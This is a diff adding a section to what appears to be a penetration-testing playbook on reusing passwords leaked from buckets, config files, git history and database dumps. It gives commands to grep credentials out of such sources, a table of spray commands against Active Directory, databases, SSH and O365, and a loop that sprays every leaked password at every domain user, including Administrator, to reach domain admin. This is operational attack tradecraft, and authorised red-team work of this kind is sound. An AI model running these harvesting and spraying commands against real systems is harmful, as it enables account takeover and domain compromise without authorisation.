@@ -131,6 +131,52 @@ nxc smb DC -u '' -p '' --rid-brute
 nxc smb DC -u '' -p '' --users
 ```
 
+### 12. Cross-protocol reuse from leaked credential dumps
+
+Once a public, SSRF-reachable, or LFI-readable resource leaks plaintext passwords (S3 bucket, `.git`, env file, app DB dump, cloud-emulator DynamoDB table), the passwords become spray candidates against **every other auth surface** in the engagement — not just the originating app. This is often the single highest-ROI pivot in cloud + AD hybrid environments.
+
+Sources to mine:
+- S3 buckets named `databases/`, `backups/`, `dumps/` — pull every `.db`, `.sqlite`, `.sql`, `.bak`.
+- `.env`, `config.php`, `settings.py`, `appsettings.json` retrieved via LFI or directory listing.
+- DynamoDB `users` / `customers` tables (LocalStack / moto defaults).
+- `pg_dump` / `mysqldump` files dropped in a writable webroot.
+- `Airflow` connections table, `Jenkins` credential store, `Vault` audit logs.
+
+Extract `(username, password)` pairs:
+
+```bash
+# Generic sqlite mining
+sqlite3 users.db ".dump" | grep -iE 'INSERT.*(user|pass|email)'
+
+# JSON / YAML configs
+grep -RiE '(password|passwd|secret|pwd)\s*[=:]\s*["\047]?[^"\047\s]{6,}' .
+
+# .git history
+git log -p --all | grep -iE 'password|secret|api[_-]?key' -B2 -A2
+```
+
+Spray candidates against EVERY auth surface, especially:
+
+| Target | Tool | Why |
+|---|---|---|
+| AD via LDAP / SMB / WinRM | `nxc smb <DC> -u users.txt -p pw.txt` | App users reuse the same password for their AD account |
+| MS SQL / MySQL / PostgreSQL | `nxc mssql ...`, `mysql -u ... -p ...` | DB admin shares the application password |
+| SSH | `hydra ssh://<host> -L users.txt -P pw.txt` | OS user shares the app password |
+| O365 / Azure AD | `MSOLSpray` | Personal-account reuse |
+| Internal apps (Mattermost, Gitea, Jenkins) | App API login | Devs reuse one password everywhere |
+
+Cross-product every recovered password against every domain user — including `Administrator` and well-known privileged principals even when they don't appear in the leak:
+
+```bash
+# All recovered passwords × all known domain users
+echo "Administrator" >> ad_users.txt   # always include even if not in the leak
+for pw in $(cat leaked_passwords.txt); do
+  nxc smb <DC_IP> -u ad_users.txt -p "$pw" --continue-on-success 2>&1 | grep -E '\[\+\]'
+done
+```
+
+The pivot that often unlocks domain admin: **one app user's password = `Administrator`'s password**. A predecessor finding a leaked DB but only treating it as "credentials for app X" leaves the entire AD compromise on the table.
+
 ## Verifying success
 
 - CrackMapExec returns `[+]` for valid combinations.
